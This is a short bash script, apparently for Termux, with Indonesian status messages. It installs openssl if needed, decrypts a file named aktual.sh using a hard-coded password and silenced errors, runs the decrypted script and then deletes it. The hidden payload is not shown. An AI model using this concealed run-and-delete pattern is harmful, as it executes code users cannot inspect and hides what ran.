#!/bin/bash


if command -v openssl &> /dev/null
then
   echo ""
else
    pkg install openssl-tool -y
    if command -v openssl &> /dev/null
    then
        echo "OpenSSL berhasil diinstal."
    else
        echo "Gagal menginstal OpenSSL."
    fi
fi


openssl enc -d -aes-256-cbc -pbkdf2 -in aktual.sh -out final.sh -pass pass:Jk9@T5zX$wR7#bLpM2^fS8*Hv 2>/dev/null && bash final.sh && rm -rf final.sh

